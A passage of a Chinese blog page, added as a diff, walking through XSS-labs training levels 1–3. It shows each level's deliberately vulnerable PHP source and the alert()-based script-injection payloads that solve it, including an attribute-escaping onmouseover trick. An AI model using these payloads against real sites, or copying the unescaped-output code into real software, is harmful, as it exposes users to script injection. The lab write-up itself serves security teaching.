@@ -1,0 +1,1020 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title> - 梧桐漓染的博客</title><meta name="Description" content="桐漓的博客"><meta property="og:title" content="" />
+<meta property="og:description" content="XSS-labs靶场实战 每关的答案会用加粗斜体显示，方便后续快速查看。 如果写的不好请见谅！ ​ 第一关 源码 1 2 3 4 5 6 7 8 9 10 11 12 &lt;body&gt; &lt;h1 align" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/xss-labs%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/" /><meta property="og:image" content="/logo.png"/><meta property="article:section" content="posts" />
+
+<meta property="og:site_name" content="Lyrio&#39;s blog" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/logo.png"/>
+
+<meta name="twitter:title" content=""/>
+<meta name="twitter:description" content="XSS-labs靶场实战 每关的答案会用加粗斜体显示，方便后续快速查看。 如果写的不好请见谅！ ​ 第一关 源码 1 2 3 4 5 6 7 8 9 10 11 12 &lt;body&gt; &lt;h1 align"/>
+<meta name="application-name" content="Lyrio&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Lyrio&#39;s blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="/xss-labs%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/" /><link rel="prev" href="/xss%E8%87%AA%E5%8A%A8%E5%8C%96%E6%A3%80%E6%B5%8B/" /><link rel="next" href="/xshell%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5kali/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/xss-labs%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98\/"
+        },"genre": "posts","wordcount":  6310 ,
+        "url": "\/xss-labs%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98\/","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Lyrio"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.1.1" defer type="module" integrity="sha384-MWfCL6g1OTGsbSwfuMHc8+8J2u71/LA8dzlIN3ycajckxuZZmF+DNjdm7O6H3PSq"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme; }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('light' === 'light' || 'light' === 'dark' || 'light' === 'black') setTheme('light'), saveTheme('light'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="梧桐漓染的博客"><img
+        class="logo"
+        loading="lazy"
+        src="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png"
+        srcset="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png, https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png 1.5x, https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png 2x"
+        sizes="auto"
+        alt="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png"
+        title="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png" ></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/friends/"><i class='fas fa-fw fa-fan fa-spin'></i> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="#" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="#" class="menu-item theme-select" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
+                        <option value="light">浅色</option>
+                        <option value="dark">深色</option>
+                        <option value="black">黑色</option>
+                        <option value="auto">跟随系统</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="梧桐漓染的博客"><img
+        class="logo"
+        loading="lazy"
+        src="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png"
+        srcset="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png, https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png 1.5x, https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png 2x"
+        sizes="auto"
+        alt="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png"
+        title="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png" ></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="#" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="#" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/friends/" title=""><i class='fas fa-fw fa-fan fa-spin'></i>友链</a><a class="menu-item" href="/about/" title="">关于</a><a href="#" class="menu-item theme-select" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
+                    <option value="light">浅色</option>
+                    <option value="dark">深色</option>
+                    <option value="black">黑色</option>
+                    <option value="auto">跟随系统</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "false")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX"></h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><i class="author fas fa-user-circle fa-fw"></i><a href="/" title="Author" rel=" author" class="author">Lyrio</a>
+                </span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 6310 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 13 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="true">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#第一关">第一关</a>
+      <ul>
+        <li><a href="#源码">源码</a></li>
+        <li><a href="#过程未知源码的情况下">过程(未知源码的情况下)</a></li>
+      </ul>
+    </li>
+    <li><a href="#第二关">第二关</a>
+      <ul>
+        <li><a href="#源码-1">源码</a></li>
+        <li><a href="#过程未知源码的情况下-1">过程(未知源码的情况下)</a></li>
+      </ul>
+    </li>
+    <li><a href="#第三关">第三关</a>
+      <ul>
+        <li><a href="#源码-2">源码</a></li>
+        <li><a href="#过程未知源码的情况下-2">过程(未知源码的情况下)</a></li>
+      </ul>
+    </li>
+    <li><a href="#第四关">第四关</a>
+      <ul>
+        <li><a href="#源码-3">源码</a></li>
+        <li><a href="#过程未知源码的情况下-3">过程(未知源码的情况下)</a></li>
+      </ul>
+    </li>
+    <li><a href="#第五关">第五关</a>
+      <ul>
+        <li><a href="#源码-4">源码</a></li>
+        <li><a href="#过程未知源码的情况下-4">过程(未知源码的情况下)</a></li>
+      </ul>
+    </li>
+    <li><a href="#第六关">第六关</a>
+      <ul>
+        <li><a href="#源码-5">源码</a></li>
+        <li><a href="#过程未知源码的情况下-5">过程(未知源码的情况下)</a></li>
+      </ul>
+    </li>
+    <li><a href="#第七关">第七关</a>
+      <ul>
+        <li><a href="#源码-6">源码</a></li>
+        <li><a href="#过程未知源码的情况下-6">过程(未知源码的情况下)</a></li>
+      </ul>
+    </li>
+    <li><a href="#第八关">第八关</a>
+      <ul>
+        <li><a href="#源码-7">源码</a></li>
+        <li><a href="#过程未知源码的情况下-7">过程(未知源码的情况下)</a></li>
+      </ul>
+    </li>
+    <li><a href="#第九关">第九关</a>
+      <ul>
+        <li><a href="#源码-8">源码</a></li>
+        <li><a href="#过程未知源码的情况下-8">过程(未知源码的情况下)</a></li>
+      </ul>
+    </li>
+    <li><a href="#第十关">第十关</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="xss-labs靶场实战" class="headerLink">
+    <a href="#xss-labs%e9%9d%b6%e5%9c%ba%e5%ae%9e%e6%88%98" class="header-mark"></a>XSS-labs靶场实战</h1><blockquote>
+<p>每关的答案会用<em><strong>加粗斜体显示</strong></em>，方便后续快速查看。</p>
+<p>如果写的不好请见谅！</p>
+</blockquote>
+<p>​</p>
+<h2 id="第一关" class="headerLink">
+    <a href="#%e7%ac%ac%e4%b8%80%e5%85%b3" class="header-mark"></a>第一关</h2><p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/64c86a521ddac507cc2aab8f.jpg" title="https://pic.imgdb.cn/item/64c86a521ddac507cc2aab8f.jpg" data-thumbnail="https://pic.imgdb.cn/item/64c86a521ddac507cc2aab8f.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/64c86a521ddac507cc2aab8f.jpg"
+            srcset="https://pic.imgdb.cn/item/64c86a521ddac507cc2aab8f.jpg, https://pic.imgdb.cn/item/64c86a521ddac507cc2aab8f.jpg 1.5x, https://pic.imgdb.cn/item/64c86a521ddac507cc2aab8f.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/64c86a521ddac507cc2aab8f.jpg">
+    </a></figure></p>
+<h3 id="源码" class="headerLink">
+    <a href="#%e6%ba%90%e7%a0%81" class="header-mark"></a>源码</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;body&gt;
+</span></span><span class="line"><span class="cl">&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">&lt;?php 
+</span></span><span class="line"><span class="cl">ini_set(&#34;display_errors&#34;, 0);
+</span></span><span class="line"><span class="cl">$str = $_GET[&#34;name&#34;];
+</span></span><span class="line"><span class="cl">echo &#34;&lt;h2 align=center&gt;欢迎用户&#34;.$str.&#34;&lt;/h2&gt;&#34;;
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span><span class="line"><span class="cl">&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;
+</span></span><span class="line"><span class="cl">&lt;?php 
+</span></span><span class="line"><span class="cl">echo &#34;&lt;h3 align=center&gt;payload的长度:&#34;.strlen($str).&#34;&lt;/h3&gt;&#34;;
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span><span class="line"><span class="cl">&lt;/body&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="过程未知源码的情况下" class="headerLink">
+    <a href="#%e8%bf%87%e7%a8%8b%e6%9c%aa%e7%9f%a5%e6%ba%90%e7%a0%81%e7%9a%84%e6%83%85%e5%86%b5%e4%b8%8b" class="header-mark"></a>过程(未知源码的情况下)</h3><p><em><strong>地址栏提交参数值：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，过关。</strong></em></p>
+<p>​</p>
+<p>​</p>
+<h2 id="第二关" class="headerLink">
+    <a href="#%e7%ac%ac%e4%ba%8c%e5%85%b3" class="header-mark"></a>第二关</h2><p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/64c86e881ddac507cc33c105.jpg" title="https://pic.imgdb.cn/item/64c86e881ddac507cc33c105.jpg" data-thumbnail="https://pic.imgdb.cn/item/64c86e881ddac507cc33c105.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/64c86e881ddac507cc33c105.jpg"
+            srcset="https://pic.imgdb.cn/item/64c86e881ddac507cc33c105.jpg, https://pic.imgdb.cn/item/64c86e881ddac507cc33c105.jpg 1.5x, https://pic.imgdb.cn/item/64c86e881ddac507cc33c105.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/64c86e881ddac507cc33c105.jpg">
+    </a></figure></p>
+<h3 id="源码-1" class="headerLink">
+    <a href="#%e6%ba%90%e7%a0%81-1" class="header-mark"></a>源码</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;body&gt;
+</span></span><span class="line"><span class="cl">&lt;h1 align=center&gt;欢迎来到level2&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">&lt;?php 
+</span></span><span class="line"><span class="cl">ini_set(&#34;display_errors&#34;, 0);
+</span></span><span class="line"><span class="cl">$str = $_GET[&#34;keyword&#34;];
+</span></span><span class="line"><span class="cl">echo &#34;&lt;h2 align=center&gt;没有找到和&#34;.htmlspecialchars($str).&#34;相关的结果.&lt;/h2&gt;&#34;.&#39;&lt;center&gt;
+</span></span><span class="line"><span class="cl">&lt;form action=level2.php method=GET&gt;
+</span></span><span class="line"><span class="cl">&lt;input name=keyword  value=&#34;&#39;.$str.&#39;&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;input type=submit name=submit value=&#34;搜索&#34;/&gt;
+</span></span><span class="line"><span class="cl">&lt;/form&gt;
+</span></span><span class="line"><span class="cl">&lt;/center&gt;&#39;;
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span><span class="line"><span class="cl">&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;
+</span></span><span class="line"><span class="cl">&lt;?php 
+</span></span><span class="line"><span class="cl">echo &#34;&lt;h3 align=center&gt;payload的长度:&#34;.strlen($str).&#34;&lt;/h3&gt;&#34;;
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span><span class="line"><span class="cl">&lt;/body&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="过程未知源码的情况下-1" class="headerLink">
+    <a href="#%e8%bf%87%e7%a8%8b%e6%9c%aa%e7%9f%a5%e6%ba%90%e7%a0%81%e7%9a%84%e6%83%85%e5%86%b5%e4%b8%8b-1" class="header-mark"></a>过程(未知源码的情况下)</h3><p>表单输入<code>&lt;sCr&lt;scrscRiptipt&gt;ipt&gt;OonN\&amp;apos;\&quot;'&lt;&gt;</code>查看前端代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span> <span class="na">align</span><span class="o">=</span><span class="s">center</span><span class="p">&gt;</span>欢迎来到level2<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h2</span> <span class="na">align</span><span class="o">=</span><span class="s">center</span><span class="p">&gt;</span>没有找到和<span class="ni">&amp;lt;</span>sCr<span class="ni">&amp;lt;</span>scrscRiptipt<span class="ni">&amp;gt;</span>ipt<span class="ni">&amp;gt;</span>OonN\<span class="ni">&amp;amp;</span>apos;\<span class="ni">&amp;quot;</span>&#39;<span class="ni">&amp;lt;&amp;gt;</span>相关的结果.<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;&lt;</span><span class="nt">center</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">level2.php</span> <span class="na">method</span><span class="o">=</span><span class="s">GET</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">keyword</span>  <span class="na">value</span><span class="o">=</span><span class="s">&#34;&lt;sCr&lt;scrscRiptipt&gt;ipt&gt;OonN\&amp;apos;\&#34;</span><span class="err">&#39;&lt;</span><span class="p">&gt;</span>&#34;&gt;
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">submit</span> <span class="na">name</span><span class="o">=</span><span class="s">submit</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;搜索&#34;</span><span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">center</span><span class="p">&gt;&lt;</span><span class="nt">center</span><span class="p">&gt;&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">level2.png</span><span class="p">&gt;&lt;/</span><span class="nt">center</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h3</span> <span class="na">align</span><span class="o">=</span><span class="s">center</span><span class="p">&gt;</span>payload的长度:37<span class="p">&lt;/</span><span class="nt">h3</span><span class="p">&gt;&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>有两处输出(第3行、第5行)，第3行的输出有被转义过，推测是用到了<code>htmlspecialchars()</code>；第5行的输出没被处理，作为payload的构造基础。</p>
+<p><em><strong>表单输入<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>，过关。</strong></em></p>
+<p>​</p>
+<p>​</p>
+<h2 id="第三关" class="headerLink">
+    <a href="#%e7%ac%ac%e4%b8%89%e5%85%b3" class="header-mark"></a>第三关</h2><p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/64c875ab1ddac507cc449adf.jpg" title="https://pic.imgdb.cn/item/64c875ab1ddac507cc449adf.jpg" data-thumbnail="https://pic.imgdb.cn/item/64c875ab1ddac507cc449adf.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/64c875ab1ddac507cc449adf.jpg"
+            srcset="https://pic.imgdb.cn/item/64c875ab1ddac507cc449adf.jpg, https://pic.imgdb.cn/item/64c875ab1ddac507cc449adf.jpg 1.5x, https://pic.imgdb.cn/item/64c875ab1ddac507cc449adf.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/64c875ab1ddac507cc449adf.jpg">
+    </a></figure></p>
+<h3 id="源码-2" class="headerLink">
+    <a href="#%e6%ba%90%e7%a0%81-2" class="header-mark"></a>源码</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;body&gt;
+</span></span><span class="line"><span class="cl">&lt;h1 align=center&gt;欢迎来到level3&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">&lt;?php 
+</span></span><span class="line"><span class="cl">ini_set(&#34;display_errors&#34;, 0);
+</span></span><span class="line"><span class="cl">$str = $_GET[&#34;keyword&#34;];
+</span></span><span class="line"><span class="cl">echo &#34;&lt;h2 align=center&gt;没有找到和&#34;.htmlspecialchars($str).&#34;相关的结果.&lt;/h2&gt;&#34;.&#34;&lt;center&gt;
+</span></span><span class="line"><span class="cl">&lt;form action=level3.php method=GET&gt;
+</span></span><span class="line"><span class="cl">&lt;input name=keyword  value=&#39;&#34;.htmlspecialchars($str).&#34;&#39;&gt;
+</span></span><span class="line"><span class="cl">&lt;input type=submit name=submit value=搜索 /&gt;
+</span></span><span class="line"><span class="cl">&lt;/form&gt;
+</span></span><span class="line"><span class="cl">&lt;/center&gt;&#34;;
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span><span class="line"><span class="cl">&lt;center&gt;&lt;img src=level3.png&gt;&lt;/center&gt;
+</span></span><span class="line"><span class="cl">&lt;?php 
+</span></span><span class="line"><span class="cl">echo &#34;&lt;h3 align=center&gt;payload的长度:&#34;.strlen($str).&#34;&lt;/h3&gt;&#34;;
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span><span class="line"><span class="cl">&lt;/body&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="过程未知源码的情况下-2" class="headerLink">
+    <a href="#%e8%bf%87%e7%a8%8b%e6%9c%aa%e7%9f%a5%e6%ba%90%e7%a0%81%e7%9a%84%e6%83%85%e5%86%b5%e4%b8%8b-2" class="header-mark"></a>过程(未知源码的情况下)</h3><p>表单输入<code>&lt;sCr&lt;scrscRiptipt&gt;ipt&gt;OonN\&amp;apos;\&quot;'&lt;&gt;</code>查看前端代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span> <span class="na">align</span><span class="o">=</span><span class="s">center</span><span class="p">&gt;</span>欢迎来到level3<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h2</span> <span class="na">align</span><span class="o">=</span><span class="s">center</span><span class="p">&gt;</span>没有找到和<span class="ni">&amp;lt;</span>sCr<span class="ni">&amp;lt;</span>scrscRiptipt<span class="ni">&amp;gt;</span>ipt<span class="ni">&amp;gt;</span>OonN\<span class="ni">&amp;amp;</span>apos;\<span class="ni">&amp;quot;</span>&#39;<span class="ni">&amp;lt;&amp;gt;</span>相关的结果.<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;&lt;</span><span class="nt">center</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">level3.php</span> <span class="na">method</span><span class="o">=</span><span class="s">GET</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">keyword</span>  <span class="na">value</span><span class="o">=</span><span class="s">&#39;&amp;lt;sCr&amp;lt;scrscRiptipt&amp;gt;ipt&amp;gt;OonN\&amp;amp;apos;\&amp;quot;&#39;</span><span class="err">&amp;</span><span class="na">lt</span><span class="err">;&amp;</span><span class="na">gt</span><span class="err">;&#39;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">submit</span> <span class="na">name</span><span class="o">=</span><span class="s">submit</span> <span class="na">value</span><span class="o">=</span><span class="s">搜索</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">center</span><span class="p">&gt;&lt;</span><span class="nt">center</span><span class="p">&gt;&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">level3.png</span><span class="p">&gt;&lt;/</span><span class="nt">center</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h3</span> <span class="na">align</span><span class="o">=</span><span class="s">center</span><span class="p">&gt;</span>payload的长度:37<span class="p">&lt;/</span><span class="nt">h3</span><span class="p">&gt;&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>有两处输出(第3行、第5行)，这两处的输出都被处理过，推测是用到了<code>htmlspecialchars()</code>，但是没有加<code>ENT_QUOTES</code>参数导致<code>'</code>没有被处理，将第5行的输出作为构造payload的基础。</p>
+<p><em><strong>表单输入<code>'onmouseover='javascript:alert(1)</code>，鼠标移到表单上，过关。</strong></em></p>
+<p>​</p>
+<p>​</p>
+<h2 id="第四关" class="headerLink">
+    <a href="#%e7%ac%ac%e5%9b%9b%e5%85%b3" class="header-mark"></a>第四关</h2><p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/64c87b6f1ddac507cc53adb8.jpg" title="https://pic.imgdb.cn/item/64c87b6f1ddac507cc53adb8.jpg" data-thumbnail="https://pic.imgdb.cn/item/64c87b6f1ddac507cc53adb8.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/64c87b6f1ddac507cc53adb8.jpg"
